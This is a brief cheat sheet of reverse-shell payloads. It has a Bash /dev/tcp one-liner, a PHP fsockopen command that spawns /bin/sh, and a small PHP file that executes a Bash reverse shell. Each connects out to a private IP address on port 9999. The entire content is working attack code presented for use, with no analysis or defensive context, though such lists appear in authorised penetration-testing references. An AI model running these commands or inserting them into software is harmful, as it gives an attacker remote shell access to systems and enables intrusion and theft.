# Various Reverse Shells

# Bash
bash -i >& /dev/tcp/10.0.0.1/9999 0>&1
##

# PHP
php -r '$sock=fsockopen("10.0.0.1",9999);exec("/bin/sh -i <&3 >&3 2>&3");'
##

<?php

$cmd = 'echo "bash -i >& /dev/tcp/10.8.0.14/9999 0>&1" | bash';
exec($cmd);

?>
##
